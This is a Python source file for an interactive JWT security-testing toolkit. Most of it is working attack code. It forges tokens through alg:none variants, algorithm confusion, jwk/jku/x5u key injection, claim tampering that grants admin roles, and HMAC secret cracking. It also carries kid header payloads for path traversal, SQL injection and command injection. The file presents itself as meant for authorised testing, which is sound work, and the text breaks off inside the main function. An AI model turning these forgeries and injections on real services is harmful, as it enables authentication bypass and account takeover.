#!/usr/bin/env python3
"""
JWTweak v2.1 - a guided, fully-offline JWT security-testing toolkit.

Just run it:   python3 JWTweak.py

No flags to memorise. Paste a token, JWTweak decodes it, analyses the risks,
recommends the attacks that fit, and walks you through each one step by step.
Every attack runs 100% offline - nothing is ever sent over the network.

For authorised security testing and research only.
Author: Rishu Ranjan  -  https://github.com/rishuranjanofficial/JWTweak
"""

import base64
import datetime
import hashlib
import hmac
import ipaddress
import json
import os
import socket
import sys
import threading

try:
    import readline  # noqa: F401  (nicer line editing / paste on *nix)
except Exception:
    pass

import jwt  # PyJWT

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec, ed25519, rsa
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    _CRYPTO = True
except Exception:
    _CRYPTO = False

__version__ = "2.1"

# --------------------------------------------------------------------------- #
#  UI layer - rich if available, clean ANSI fallback otherwise
# --------------------------------------------------------------------------- #
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich.text import Text
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
    from rich import box
    _RICH = True
except Exception:
    _RICH = False


class _AnsiFallback:
    """Minimal, dependency-free UI used only when 'rich' is not installed."""
    class _C:
        H = "\033[95m"; B = "\033[94m"; G = "\033[92m"; Y = "\033[93m"
        R = "\033[91m"; D = "\033[90m"; E = "\033[0m"; BOLD = "\033[1m"

    def __init__(self, color=True):
        self.color = color and sys.stdout.isatty()
        if not self.color:
            for k in vars(self._C):
                if not k.startswith("_"):
                    setattr(self._C, k, "")

    def rule(self, title=""):
        line = "-" * 68
        print(f"\n{self._C.D}{line}{self._C.E}")
        if title:
            print(f"{self._C.BOLD}{title}{self._C.E}")

    def banner(self, block, plain, tagline, meta, legal):
        print(f"{self._C.B}{self._C.BOLD}{plain}{self._C.E}")
        print(f"    {self._C.BOLD}{tagline}{self._C.E}")
        print(f"    {self._C.D}{meta}{self._C.E}")
        print(f"    {self._C.Y}{legal}{self._C.E}")

    def print(self, msg=""):
        print(msg)

    def info(self, m):    print(f"{self._C.B}[*]{self._C.E} {m}")
    def success(self, m): print(f"{self._C.G}[+]{self._C.E} {m}")
    def warn(self, m):    print(f"{self._C.Y}[!]{self._C.E} {m}")
    def error(self, m):   print(f"{self._C.R}[-]{self._C.E} {m}")

    def panel(self, body, title=None, style=""):
        if title:
            print(f"\n{self._C.BOLD}{title}{self._C.E}")
        print(body)

    def json(self, obj):
        print(json.dumps(obj, indent=2) if not isinstance(obj, str) else obj)

    def token(self, label, tok):
        print(f"\n{self._C.BOLD}{label}{self._C.E}")
        print(f"{self._C.G}{tok}{self._C.E}\n")

    def risk_table(self, findings):
        colors = {"HIGH": self._C.R, "MED": self._C.Y, "INFO": self._C.B,
                  "OK": self._C.G}
        for sev, msg in findings:
            print(f"  {colors.get(sev,'')}{sev:<4}{self._C.E}  {msg}")

    def menu(self, title, groups, footer=""):
        self.rule(title)
        for gname, items in groups:
            print(f"\n{self._C.BOLD}{gname.upper()}{self._C.E}")
            for key, label, desc, rec in items:
                star = f" {self._C.Y}*{self._C.E}" if rec else ""
                pad = "" if desc else ""
                d = f"  {self._C.D}- {desc}{self._C.E}" if desc else ""
                print(f"  {self._C.BOLD}{self._C.B}{key:>2}{self._C.E}) "
                      f"{label}{star}{d}")
        if footer:
            print(f"\n{self._C.D}{footer}{self._C.E}")

    def ask(self, prompt, default=None, password=False):
        d = f" [{default}]" if default else ""
        val = input(f"{self._C.BOLD}{prompt}{self._C.E}{d}: ").strip()
        return val or (default or "")

    def confirm(self, prompt, default=False):
        d = "Y/n" if default else "y/N"
        val = input(f"{self._C.BOLD}{prompt}{self._C.E} [{d}]: ").strip().lower()
        if not val:
            return default
        return val.startswith("y")

    def crack_run(self, wordlist_path, total, verify):
        tried = 0
        with open(wordlist_path, "rb") as fh:
            for raw in fh:
                secret = raw.rstrip(b"\r\n")
                tried += 1
                if tried % 5000 == 0:
                    print(f"  ...{tried} tried", end="\r")
                if verify(secret):
                    return secret, tried
        return None, tried


class _RichUI:
    def __init__(self, color=True):
        self.c = Console(no_color=not color, highlight=False)

    def rule(self, title=""):
        self.c.rule(f"[bold]{title}[/]" if title else "")

    def banner(self, block, plain, tagline, meta, legal):
        art = Text(block, style="bold cyan")
        body = Text.assemble(art, "\n\n",
                             (tagline, "bold white"), "\n",
                             (meta, "dim"), "\n",
                             (legal, "yellow"))
        self.c.print(Panel(body, border_style="cyan", box=box.DOUBLE,
                           padding=(0, 2), expand=False))

    def print(self, msg=""):
        self.c.print(msg)

    def info(self, m):    self.c.print(f"[blue][*][/] {m}")
    def success(self, m): self.c.print(f"[green][+][/] {m}")
    def warn(self, m):    self.c.print(f"[yellow][!][/] {m}")
    def error(self, m):   self.c.print(f"[red][-][/] {m}")

    def panel(self, body, title=None, style="cyan"):
        self.c.print(Panel(body, title=title, border_style=style,
                           box=box.ROUNDED, expand=False))

    def json(self, obj):
        text = json.dumps(obj, indent=2) if not isinstance(obj, str) else obj
        try:
            self.c.print(Syntax(text, "json", theme="ansi_dark",
                                background_color="default"))
        except Exception:
            self.c.print(text)

    def token(self, label, tok):
        self.c.print(Panel(Text(tok, style="bold green"),
                           title=f"[bold]{label}[/]",
                           subtitle="[dim]select the line above to copy[/]",
                           border_style="green", box=box.ROUNDED, expand=False))

    def risk_table(self, findings):
        t = Table(box=box.SIMPLE, show_header=True, header_style="bold",
                  expand=False)
        t.add_column("Severity", no_wrap=True)
        t.add_column("Finding")
        sev_style = {"HIGH": "bold red", "MED": "yellow", "INFO": "blue",
                     "OK": "green"}
        for sev, msg in findings:
            t.add_row(f"[{sev_style.get(sev,'')}]{sev}[/]", msg)
        self.c.print(t)

    def menu(self, title, groups, footer=""):
        t = Table(box=box.SQUARE, show_header=False, expand=False,
                  border_style="grey37", padding=(0, 1),
                  title=f"[bold cyan]{title}[/]", title_justify="left")
        t.add_column("k", justify="center", style="bold cyan", no_wrap=True, width=3)
        t.add_column("label", no_wrap=False)
        for gi, (gname, items) in enumerate(groups):
            if gi:
                t.add_row("", "")
            t.add_row("", f"[bold magenta]{gname.upper()}[/]")
            for key, label, desc, rec in items:
                badge = " [bold yellow]★[/]" if rec else ""
                sub = f"  [dim]{desc}[/]" if desc else ""
                t.add_row(f"[cyan]{key}[/]", f"[white]{label}[/]{badge}{sub}")
        self.c.print(t)
        if footer:
            self.c.print(f"[dim]{footer}[/]")

    def ask(self, prompt, default=None, password=False):
        return Prompt.ask(f"[bold]{prompt}[/]", default=default or "",
                          password=password, console=self.c).strip()

    def confirm(self, prompt, default=False):
        return Confirm.ask(f"[bold]{prompt}[/]", default=default, console=self.c)

    def crack_run(self, wordlist_path, total, verify):
        tried = 0
        cols = [TextColumn("[progress.description]{task.description}"),
                BarColumn(), TextColumn("{task.completed}/{task.total}"),
                TimeElapsedColumn()]
        with Progress(*cols, console=self.c, transient=True) as prog:
            task = prog.add_task("cracking", total=total or None)
            with open(wordlist_path, "rb") as fh:
                for raw in fh:
                    secret = raw.rstrip(b"\r\n")
                    tried += 1
                    prog.advance(task)
                    if verify(secret):
                        return secret, tried
        return None, tried


def make_ui(color=True, prefer_rich=True):
    if prefer_rich and _RICH:
        return _RichUI(color=color)
    return _AnsiFallback(color=color)


# --------------------------------------------------------------------------- #
#  base64url + parsing
# --------------------------------------------------------------------------- #
def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64decode(data + b"=" * (-len(data) % 4))


def _json_b64(obj):
    return b64url_encode(json.dumps(obj, separators=(",", ":")))


class JWTError(Exception):
    pass


def parse_jwt(token):
    token = token.strip()
    parts = token.split(".")
    if len(parts) not in (2, 3):
        raise JWTError("Token must have 2 or 3 dot-separated parts.")
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception as e:
        raise JWTError(f"Could not decode header: {e}")
    try:
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        try:
            payload = b64url_decode(parts[1]).decode("utf-8", "replace")
        except Exception as e:
            raise JWTError(f"Could not decode payload: {e}")
    return header, payload, (parts[2] if len(parts) == 3 else "")


def looks_like_jwt(token):
    parts = token.strip().split(".")
    return len(parts) in (2, 3) and parts[0].startswith("ey")


# --------------------------------------------------------------------------- #
#  Signing / keys  (verified attack core, unchanged from v2.0)
# --------------------------------------------------------------------------- #
_HASHES = {"256": hashlib.sha256, "384": hashlib.sha384, "512": hashlib.sha512}


def hmac_sign(header, payload, key):
    if isinstance(key, str):
        key = key.encode()
    h = _HASHES.get(header.get("alg", "HS256")[-3:], hashlib.sha256)
    si = f"{_json_b64(header)}.{_json_b64(payload)}".encode()
    return f"{_json_b64(header)}.{_json_b64(payload)}." \
           f"{b64url_encode(hmac.new(key, si, h).digest())}"


def unsigned_token(header, payload):
    return f"{_json_b64(header)}.{_json_b64(payload)}."


def _need_crypto():
    if not _CRYPTO:
        raise JWTError("Needs the 'cryptography' package: pip install cryptography")


def gen_rsa(bits=2048):
    _need_crypto()
    k = rsa.generate_private_key(public_exponent=65537, key_size=bits)
    priv = k.private_bytes(serialization.Encoding.PEM,
                           serialization.PrivateFormat.PKCS8,
                           serialization.NoEncryption())
    pub = k.public_key().public_bytes(serialization.Encoding.PEM,
                                       serialization.PublicFormat.SubjectPublicKeyInfo)
    return k, priv, pub


def gen_ec(curve="P-256"):
    _need_crypto()
    curves = {"P-256": ec.SECP256R1(), "P-384": ec.SECP384R1(), "P-521": ec.SECP521R1()}
    k = ec.generate_private_key(curves.get(curve, ec.SECP256R1()))
    priv = k.private_bytes(serialization.Encoding.PEM,
                           serialization.PrivateFormat.PKCS8,
                           serialization.NoEncryption())
    pub = k.public_key().public_bytes(serialization.Encoding.PEM,
                                       serialization.PublicFormat.SubjectPublicKeyInfo)
    return k, priv, pub


def gen_ed25519():
    _need_crypto()
    k = ed25519.Ed25519PrivateKey.generate()
    priv = k.private_bytes(serialization.Encoding.PEM,
                           serialization.PrivateFormat.PKCS8,
                           serialization.NoEncryption())
    pub = k.public_key().public_bytes(serialization.Encoding.PEM,
                                       serialization.PublicFormat.SubjectPublicKeyInfo)
    return k, priv, pub


def rsa_public_jwk(pub_pem, kid="jwtweak"):
    jwk = json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(
        serialization.load_pem_public_key(pub_pem)))
    jwk["kid"] = kid
    jwk.setdefault("use", "sig")
    jwk.setdefault("alg", "RS256")
    return jwk


def self_signed_cert(key, cn="jwtweak"):
    _need_crypto()
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    return (x509.CertificateBuilder().subject_name(name).issuer_name(name)
            .public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .sign(key, hashes.SHA256()))


# --------------------------------------------------------------------------- #
#  Analysis + attacks
# --------------------------------------------------------------------------- #
def analyze(header, payload):
    findings = []
    alg = str(header.get("alg", "")).lower()
    if alg in ("none", ""):
        findings.append(("HIGH", "alg is 'none'/empty - signature may be unverified."))
    if alg.startswith("hs"):
        findings.append(("INFO", "HMAC alg - crackable offline if the secret is weak."))
    if alg.startswith(("rs", "es", "ps")):
        findings.append(("INFO", "Asymmetric alg - test algorithm confusion + jwk/jku."))
    for h in ("jku", "x5u"):
        if h in header:
            findings.append(("HIGH", f"'{h}' header present - SSRF / key-injection surface."))
    if "jwk" in header:
        findings.append(("HIGH", "'jwk' header present - embedded-key injection (CVE-2018-0114)."))
    if "kid" in header:
        findings.append(("MED", "'kid' header present - test path traversal / SQLi / cmd injection."))
    if isinstance(payload, dict):
        now = datetime.datetime.now(datetime.timezone.utc).timestamp()
        if "exp" not in payload:
            findings.append(("MED", "No 'exp' claim - token may never expire."))
        elif isinstance(payload["exp"], (int, float)) and payload["exp"] < now:
            findings.append(("INFO", "Token is expired - test whether the server still accepts it."))
    if not findings:
        findings.append(("OK", "No obvious red flags in header/claims."))
    return findings


def recommendations(header):
    """Return a set of menu keys to flag as 'recommended' for this token."""
    rec = {"1"}
    alg = str(header.get("alg", "")).lower()
    rec.add("2")  # none is always worth a shot
    if alg.startswith(("rs", "es", "ps")):
        rec.update({"3", "6", "7"})
    if alg.startswith("hs"):
        rec.add("b")  # crack
    if "kid" in header:
        rec.add("9")
    if "jku" in header or "x5u" in header:
        rec.update({"7", "8"})
    if "jwk" in header:
        rec.add("6")
    return rec


def attack_none(header, payload):
    out = []
    for v in ("none", "None", "NONE", "nOnE"):
        h = dict(header); h["alg"] = v
        out.append((f"alg={v}", unsigned_token(h, payload)))
    return out


def attack_confusion(header, payload, public_key_pem):
    out = []
    for alg in ("HS256", "HS384", "HS512"):
        h = dict(header); h["alg"] = alg
        out.append((f"RS->{alg} confusion (public key as HMAC secret)",
                    hmac_sign(h, payload, public_key_pem)))
    return out


def attack_jwk(header, payload):
    _need_crypto()
    _, priv, pub = gen_rsa()
    jwk = rsa_public_jwk(pub, "jwtweak-jwk")
    pd = payload if isinstance(payload, dict) else {}
    tok = jwt.encode(pd, priv, algorithm="RS256",
                     headers={"jwk": jwk, "kid": jwk["kid"]})
    return [("jwk header injection (CVE-2018-0114)", tok)], None


def attack_jku(header, payload, url):
    _need_crypto()
    _, priv, pub = gen_rsa()
    jwk = rsa_public_jwk(pub, "jwtweak-jku")
    jwks = json.dumps({"keys": [jwk]}, indent=2)
    pd = payload if isinstance(payload, dict) else {}
    tok = jwt.encode(pd, priv, algorithm="RS256",
                     headers={"jku": url, "kid": jwk["kid"]})
    return [("jku header injection (attacker-hosted JWKS)", tok)], ("jwks.json", jwks)


def attack_x5(header, payload, url=None):
    _need_crypto()
    key, priv, pub = gen_rsa()
    cert = self_signed_cert(key)
    x5c = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()
    pd = payload if isinstance(payload, dict) else {}
    out = [("x5c header injection (self-signed cert chain)",
            jwt.encode(pd, priv, algorithm="RS256", headers={"x5c": [x5c]}))]
    artifact = None
    if url:
        out.append(("x5u header injection (attacker-hosted cert)",
                    jwt.encode(pd, priv, algorithm="RS256", headers={"x5u": url})))
        artifact = ("cert.pem", cert.public_bytes(serialization.Encoding.PEM).decode())
    return out, artifact


def attack_kid(header, payload, injected_key="jwtweak"):
    out = []
    h = dict(header); h["alg"] = "HS256"; h["kid"] = "../../../../../../../../dev/null"
    out.append(("kid path traversal -> /dev/null (empty HMAC key)",
                hmac_sign(h, payload, b"")))
    h2 = dict(header); h2["alg"] = "HS256"
    h2["kid"] = "nonexistent' UNION SELECT '%s'-- -" % injected_key
    out.append((f"kid SQLi -> key '{injected_key}'", hmac_sign(h2, payload, injected_key)))
    h3 = dict(header); h3["alg"] = "HS256"; h3["kid"] = "key.pem; sleep 0"
    out.append(("kid command-injection probe", hmac_sign(h3, payload, injected_key)))
    return out


def attack_signature(token, header, payload):
    parts = token.split(".")
    out = [("signature stripped (empty)", f"{parts[0]}.{parts[1]}.")]
    if len(parts) == 3 and parts[2]:
        flip = "A" if parts[2][-1] != "A" else "B"
        out.append(("last signature char flipped",
                    f"{parts[0]}.{parts[1]}.{parts[2][:-1]}{flip}"))
    return out


def attack_resign(header, payload, alg, secret=None, key_pem=None):
    pd = payload if isinstance(payload, dict) else {}
    h = {k: v for k, v in header.items() if k not in ("jwk", "jku", "x5u", "x5c")}
    h["alg"] = alg
    extra = {k: header[k] for k in ("kid", "typ") if k in header}
    if alg.startswith("HS"):
        secret = secret or "secret"
        return [(f"re-signed {alg} (secret='{secret}')", hmac_sign(h, pd, secret))], None
    if alg == "none":
        return [("re-signed alg=none", unsigned_token(h, pd))], None
    _need_crypto()
    gen = None
    if key_pem:
        signing_key = key_pem
    else:
        if alg.startswith(("RS", "PS")):
            _, signing_key, pub = gen_rsa()
        elif alg.startswith("ES"):
            _, signing_key, pub = gen_ec({"ES256": "P-256", "ES384": "P-384",
                                          "ES512": "P-521"}.get(alg, "P-256"))
        elif alg == "EdDSA":
            _, signing_key, pub = gen_ed25519()
        else:
            raise JWTError(f"Unsupported algorithm: {alg}")
        gen = pub.decode()
    tok = jwt.encode(pd, signing_key, algorithm=alg, headers=extra)
    return [(f"re-signed {alg}", tok)], gen


def verify_hmac(token, alg, secret):
    try:
        jwt.decode(token, secret, algorithms=[alg],
                   options={"verify_exp": False, "verify_aud": False})
        return True
    except Exception:
        return False


# --------------------------------------------------------------------------- #
#  Optional local server (keeps jku/x5u testing fully offline)
# --------------------------------------------------------------------------- #
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def serve_file(filename, content, port=8000):
    import http.server
    import tempfile
    d = tempfile.mkdtemp(prefix="jwtweak_")
    with open(os.path.join(d, filename), "w") as fh:
        fh.write(content)

    class H(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **k): super().__init__(*a, directory=d, **k)
        def log_message(self, *a): pass

    httpd = http.server.ThreadingHTTPServer(("0.0.0.0", port), H)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, d


# --------------------------------------------------------------------------- #
#  Guided interactive flows
# --------------------------------------------------------------------------- #
BANNER_BLOCK = (
    "     ██╗██╗    ██╗████████╗██╗    ██╗███████╗ █████╗ ██╗  ██╗\n"
    "     ██║██║    ██║╚══██╔══╝██║    ██║██╔════╝██╔══██╗██║ ██╔╝\n"
    "     ██║██║ █╗ ██║   ██║   ██║ █╗ ██║█████╗  ███████║█████╔╝ \n"
    "██   ██║██║███╗██║   ██║   ██║███╗██║██╔══╝  ██╔══██║██╔═██╗ \n"
    "╚█████╔╝╚███╔███╔╝   ██║   ╚███╔███╔╝███████╗██║  ██║██║  ██╗\n"
    " ╚════╝  ╚══╝╚══╝    ╚═╝    ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝"
)

BANNER_PLAIN = (
    "     ___        _______                    _\n"
    "    | \\ \\      / /_   _|_      _____  __ _| | __\n"
    " _  | |\\ \\ /\\ / /  | | \\ \\ /\\ / / _ \\/ _` | |/ /\n"
    "| |_| | \\ V  V /   | |  \\ V  V /  __/ (_| |   <\n"
    " \\___/   \\_/\\_/    |_|   \\_/\\_/ \\___|\\__,_|_|\\_\\"
)

TAGLINE = "JSON Web Token security testing toolkit"
META = f"v{__version__}  ·  100% offline  ·  github.com/rishuranjanofficial/JWTweak"
LEGAL = "For authorised security testing and research only."


class App:
    def __init__(self, ui, allow_server=True):
        self.ui = ui
        self.allow_server = allow_server
        self.token = None
        self.header = None
        self.payload = None
        self.signature = ""
        self._servers = []

    # ---- token intake / analysis ---------------------------------------- #
    def load_token(self, initial=None):
        while True:
            raw = initial or self.ui.ask("Paste a JWT, or a file path")
            initial = None
            if not raw:
                continue
            if os.path.isfile(raw):
                raw = open(raw).read().strip()
            if not looks_like_jwt(raw):
                self.ui.warn("That doesn't look like a JWT.")
                if not self.ui.confirm("Try to parse it anyway?", default=False):
                    continue
            try:
                self.header, self.payload, self.signature = parse_jwt(raw)
                self.token = raw.strip()
                return
            except JWTError as e:
                self.ui.error(str(e))

    def show_overview(self):
        self.ui.rule("Decoded token")
        self.ui.panel(self._json_str(self.header), title="Header", style="cyan")
        self.ui.panel(self._json_str(self.payload), title="Payload", style="cyan")
        self.ui.rule("Risk analysis")
        self.ui.risk_table(analyze(self.header, self.payload))

    def _json_str(self, obj):
        return json.dumps(obj, indent=2) if isinstance(obj, (dict, list)) else str(obj)

    # ---- output helper --------------------------------------------------- #
    def _emit(self, results, extra_note=None):
        for label, tok in results:
            self.ui.token(label, tok)
        if extra_note:
            self.ui.info(extra_note)
        if self.ui.confirm("Save these token(s) to a file?", default=False):
            path = self.ui.ask("Filename", default="jwtweak_tokens.txt")
            with open(path, "a") as fh:
                for label, tok in results:
                    fh.write(f"# {label}\n{tok}\n\n")
            self.ui.success(f"Appended {len(results)} token(s) to {path}")

    def _pem_prompt(self, prompt):
        val = self.ui.ask(prompt)
        if not val:
            return None
        if os.path.isfile(val):
            return open(val, "rb").read()
        return val.encode()

    # ---- individual attack flows ---------------------------------------- #
    def flow_decode(self):
        self.show_overview()

    def flow_none(self):
        self.ui.info("Emitting alg:none in four casings with the signature stripped.")
        self._emit(attack_none(self.header, self.payload))

    def flow_confusion(self):
        self.ui.panel(
            "Algorithm confusion: if the server verifies RS/ES tokens with a "
            "PUBLIC key, we sign an HS256 token using that public key AS the "
            "HMAC secret. You need the target's public key (PEM).",
            title="What this does", style="magenta")
        pem = self._pem_prompt("Target PUBLIC key (paste PEM or file path)")
        if not pem:
            self.ui.error("A public key is required for this attack.")
            return
        self._emit(attack_confusion(self.header, self.payload, pem))

    def flow_resign(self):
        alg = self.ui.ask("Algorithm (HS256/RS256/PS256/ES256/EdDSA/none)",
                          default="HS256")
        secret = key_pem = None
        if alg.startswith("HS"):
            secret = self.ui.ask("HMAC secret", default="secret")
        elif alg != "none":
            key_pem = self._pem_prompt("Private key (PEM/path, blank = auto-generate)")
        results, pub = attack_resign(self.header, self.payload, alg, secret, key_pem)
        if pub:
            self.ui.panel(pub, title="Generated PUBLIC key (share with target if needed)",
                          style="cyan")
        self._emit(results)

    def flow_signature(self):
        self._emit(attack_signature(self.token, self.header, self.payload))

    def flow_jwk(self):
        self.ui.panel("Embeds a freshly generated attacker public key in the "
                      "'jwk' header and signs with the matching private key.",
                      title="What this does", style="magenta")
        results, _ = attack_jwk(self.header, self.payload)
        self._emit(results)

    def flow_jku(self):
        self.ui.panel("Sets the 'jku' header to a URL you control that serves a "
                      "JWKS containing our attacker key. JWTweak builds the JWKS "
                      "for you - it never uploads anything.", title="What this does",
                      style="magenta")
        url = self.ui.ask("jku URL you control", default="http://127.0.0.1:8000/jwks.json")
        results, artifact = attack_jku(self.header, self.payload, url)
        self._emit(results)
        self._offer_hosting(artifact)

    def flow_x5(self):
        self.ui.panel("Generates a self-signed cert, embeds it in 'x5c', and "
                      "(optionally) points 'x5u' at a URL you control.",
                      title="What this does", style="magenta")
        url = self.ui.ask("x5u URL you control (blank = x5c only)", default="")
        results, artifact = attack_x5(self.header, self.payload, url or None)
        self._emit(results)
        self._offer_hosting(artifact)

    def _offer_hosting(self, artifact):
        if not artifact:
            return
        fname, content = artifact
        self.ui.panel(content, title=f"Host this as {fname}", style="yellow")
        if self.allow_server and self.ui.confirm(
                f"Serve {fname} now on a local HTTP server (offline)?", default=False):
            port = int(self.ui.ask("Port", default="8000") or "8000")
            try:
                httpd, d = serve_file(fname, content, port)
                self._servers.append(httpd)
                ip = local_ip()
                self.ui.success(f"Serving at  http://{ip}:{port}/{fname}  "
                                f"(and http://127.0.0.1:{port}/{fname})")
                self.ui.info("Point the token's URL header at that address. "
                             "Server stops when you quit JWTweak.")
            except Exception as e:
                self.ui.error(f"Could not start server: {e}")
        else:
            path = self.ui.ask("Or write it to a file (blank = skip)", default="")
            if path:
                open(path, "w").write(content)
                self.ui.success(f"Wrote {path}")

    def flow_kid(self):
        self.ui.panel("Builds tokens that abuse how the server resolves the 'kid': "
                      "path traversal to /dev/null (empty key), SQLi returning an "
                      "attacker key, and a command-injection probe.",
                      title="What this does", style="magenta")
        k = self.ui.ask("Attacker-controlled key for the SQLi case", default="jwtweak")
        self._emit(attack_kid(self.header, self.payload, k))

    def flow_tamper(self):
        if not isinstance(self.payload, dict):
            self.ui.error("Payload is not JSON - cannot tamper structurally.")
            return
        p = dict(self.payload)
        while True:
            self.ui.panel(self._json_str(p), title="Working payload", style="cyan")
            choice = self.ui.ask(
                "  [a] remove exp   [b] exp=+10y   [c] make admin   "
                "[d] set a claim   [e] replace JSON   [s] sign/finish", default="s")
            far = int((datetime.datetime.now(datetime.timezone.utc)
                       + datetime.timedelta(days=3650)).timestamp())
            if choice == "a":
                p.pop("exp", None)
            elif choice == "b":
                p["exp"] = far
            elif choice == "c":
                p.update({"role": "admin", "admin": True, "isAdmin": True})
            elif choice == "d":
                key = self.ui.ask("Claim key")
                val = self.ui.ask('Value (JSON, e.g. "admin" or 1 or true)')
                try:
                    p[key] = json.loads(val)
                except Exception:
                    p[key] = val
            elif choice == "e":
                raw = self.ui.ask("Paste full JSON payload")
                try:
                    p = json.loads(raw)
                except Exception as e:
                    self.ui.error(f"Invalid JSON: {e}")
            elif choice == "s":
                break
            else:
                break
        # Commit the edited claims to the working session so subsequent
        # attacks (confusion, resign, jwk, jku, ...) operate on them too.
        if self.ui.confirm("Apply these claim changes to the working token "
                           "(so other attacks use them)?", default=True):
            self.payload = p
            self.token = unsigned_token(self.header, p)
            self.ui.success("Working token updated.")
        how = self.ui.ask("Also emit a signed copy now?  [n] none/unsigned   "
                          "[h] HS256+secret   [k] keep header, unsigned   "
                          "[skip]", default="n")
        if how == "h":
            secret = self.ui.ask("HMAC secret", default="secret")
            h = dict(self.header); h["alg"] = "HS256"
            self._emit([("claim-tampered, HS256", hmac_sign(h, p, secret))])
        elif how == "k":
            self._emit([("claim-tampered (header kept, unsigned)",
                         unsigned_token(self.header, p))])
        elif how == "skip":
            pass
        else:
            h = dict(self.header); h["alg"] = "none"
            self._emit([("claim-tampered, alg=none", unsigned_token(h, p))])

    def flow_crack(self):
        alg = self.header.get("alg", "")
        if not alg.upper().startswith("HS"):
            self.ui.error(f"Token uses {alg}, not HMAC - cracking doesn't apply.")
            return
        wl = self.ui.ask("Wordlist path")
        if not os.path.isfile(wl):
            self.ui.error("Wordlist not found."); return
        total = sum(1 for _ in open(wl, "rb", buffering=1 << 20))
        self.ui.info(f"Trying {total} candidates against {alg} ...")
        secret, tried = self.ui.crack_run(
            wl, total, lambda s: verify_hmac(self.token, alg, s))
        if secret is not None:
            self.ui.success(f"SECRET FOUND after {tried}: "
                            f"{secret.decode(errors='replace')}")
            if self.ui.confirm("Forge a token with this secret now?", default=True):
                self.flow_tamper()
        else:
            self.ui.error(f"Not found ({tried} tried).")

    def flow_suite(self):
        self.ui.info("Running every applicable attack offline ...")
        results = []
        results += attack_none(self.header, self.payload)
        results += attack_signature(self.token, self.header, self.payload)
        results += attack_kid(self.header, self.payload)
        for a in ("HS256", "HS384", "HS512"):
            results += attack_resign(self.header, self.payload, a, secret="secret")[0]
        if str(self.header.get("alg", "")).lower().startswith(("rs", "es", "ps")):
            pem = self._pem_prompt("Target PUBLIC key for confusion (blank = skip)")
            if pem:
                results += attack_confusion(self.header, self.payload, pem)
        if _CRYPTO:
            results += attack_jwk(self.header, self.payload)[0]
            results += attack_jku(self.header, self.payload,
                                  "http://127.0.0.1:8000/jwks.json")[0]
            results += attack_x5(self.header, self.payload,
                                 "http://127.0.0.1:8000/cert.pem")[0]
            for a in ("ES256", "EdDSA"):
                results += attack_resign(self.header, self.payload, a)[0]
        path = self.ui.ask("Write all tokens to", default="jwtweak_tokens.txt")
        with open(path, "w") as fh:
            for label, tok in results:
                fh.write(f"# {label}\n{tok}\n\n")
        self.ui.success(f"Wrote {len(results)} candidate tokens to {path}")

    # ---- menu loop ------------------------------------------------------- #
    def menu_groups(self, rec):
        def item(k, label, desc):
            return (k, label, desc, k in rec)
        return [
            ("Recon", [item("1", "Decode & analyse", "pretty-print + risk report")]),
            ("Signature / algorithm", [
                item("2", "alg:none variants", "none / None / NONE / nOnE"),
                item("3", "Algorithm confusion", "RS/ES public key -> HMAC"),
                item("4", "Re-sign token", "HS/RS/PS/ES/EdDSA + key"),
                item("5", "Signature strip / flip", "drop or corrupt the signature")]),
            ("Key-resolution header injection", [
                item("6", "jwk injection", "embed attacker key (CVE-2018-0114)"),
                item("7", "jku injection", "attacker-hosted JWKS"),
                item("8", "x5u / x5c injection", "attacker certificate")]),
            ("Claims / keys", [
                item("9", "kid injection", "traversal / SQLi / cmd injection"),
                item("a", "Claim tampering", "exp / role / arbitrary claims"),
                item("b", "Crack HMAC secret", "offline wordlist attack")]),
            ("Automation", [
                item("s", "Run recommended suite", "every applicable attack -> file"),
                item("t", "Load a different token", ""),
                item("q", "Quit", "")]),
        ]

    def run(self, initial_token=None):
        self.ui.banner(BANNER_BLOCK, BANNER_PLAIN, TAGLINE, META, LEGAL)
        self.load_token(initial_token)
        self.show_overview()
        dispatch = {"1": self.flow_decode, "2": self.flow_none,
                    "3": self.flow_confusion, "4": self.flow_resign,
                    "5": self.flow_signature, "6": self.flow_jwk,
                    "7": self.flow_jku, "8": self.flow_x5, "9": self.flow_kid,
                    "a": self.flow_tamper, "b": self.flow_crack,
                    "s": self.flow_suite}
        while True:
            rec = recommendations(self.header)
            self.ui.menu("JWTweak menu", self.menu_groups(rec),
                         footer="type a number/letter, or q to quit")
            choice = self.ui.ask("choice").lower()
            try:
                if choice == "q":
                    break
                elif choice == "t":
                    self.load_token()
                    self.show_overview()
                elif choice in dispatch:
                    dispatch[choice]()
                else:
                    self.ui.warn("Unknown option.")
            except JWTError as e:
                self.ui.error(str(e))
            except (KeyboardInterrupt, EOFError):
                self.ui.print(); break
            except Exception as e:
                self.ui.error(f"Unexpected error: {e}")
        for httpd in self._servers:
            try: httpd.shutdown()
            except Exception: pass
        self.ui.print("bye.")


def main(argv=None):
    argv = sys.argv[1:] if argv is None else argv
    color = "--no-color" not in argv
    prefer_rich = "--no-rich" not in argv
    initial = None
    for a in argv:
        if not a.startswith("-"):
            initial = a
    if "-h" in argv or "--help" in argv:
        print(__doc__)
        print("Usage: python3 JWTweak.py [token-or-file] "
              "[--no-color] [--no-rich]")
        print("No options needed - just run it and follow the menu.")
        return
    if "-V" in argv or "--version" in argv:
